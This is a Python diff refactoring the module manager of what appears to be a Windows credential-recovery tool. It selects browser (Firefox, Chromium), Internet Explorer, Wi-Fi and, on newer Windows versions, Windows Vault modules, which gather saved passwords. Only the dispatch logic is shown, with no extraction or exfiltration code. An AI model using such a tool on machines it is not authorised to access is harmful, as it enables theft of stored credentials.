@@ -2,6 +2,9 @@ from modules.chromium.chromium import Chromium
 from modules.firefox.mozilla import Mozilla
 from modules.windows.ie import IE
 from modules.windows.wifi import Wifi
+from modules.windows.vault import Vault
+
+import libs.windows.winstructure as win
 
 mozilla_browsers = [
 	(u'firefox', u'{APPDATA}\\Mozilla\\Firefox'),
@@ -47,6 +50,13 @@ class ModuleManager:
 			'wifi': False
 		}
 
+	def iterate_modules(self, module, targets, modules_array, key):
+		if (module not in targets.get(key)) and (module in [item[0] for item in modules_array]):
+			for item in modules_array:
+				if module == item[0].lower():
+					targets.get(key).append(item)
+					break
+
 	def select_target_modules(self, modules):
 		if isinstance(modules, list):
 			modules = [module.lower() for module in modules]
@@ -69,24 +79,28 @@ class ModuleManager:
 				self.iterate_modules(module.lower(), self.targets, mozilla_browsers, 'mozilla')
 				self.iterate_modules(module.lower(), self.targets, chromium_browsers, 'chromium')
 
-	def iterate_modules(self, module, targets, modules_array, key):
-		if (module not in targets.get(key)) and (module in [item[0] for item in modules_array]):
-			for item in modules_array:
-				if module == item[0].lower():
-					targets.get(key).append(item)
-					break
+	def clear_targets(self):
+		self.targets = {
+			'mozilla': [],
+			'chromium': [],
+			'ie': False,
+			'wifi': False
+		}
 
-	def prepare_modules_drivers(self):
-		driver = []
+	def factory_drivers(self):
+		drivers = []
 		for key in self.targets.keys():
 			if self.targets.get(key):
 				match key:
 					case 'mozilla':
-						driver.extend([Mozilla(browser_name=name, path=path) for name, path in self.targets.get(key)])
+						drivers.extend([Mozilla(browser_name=name, path=path) for name, path in self.targets.get(key)])
 					case 'chromium':
-						driver.extend([Chromium(browser_name=name, paths=paths) for name, paths in self.targets.get(key)])
+						drivers.extend([Chromium(browser_name=name, paths=paths) for name, paths in self.targets.get(key)])
 					case 'ie':
-						driver.extend([IE()])
+						if float(win.get_os_version()) > 6.1:
+							drivers.extend([Vault()])
+						else:
+							drivers.extend([IE()])
 					case 'wifi':
-						driver.extend([Wifi()])
-		return driver
+						drivers.extend([Wifi()])
+		return drivers
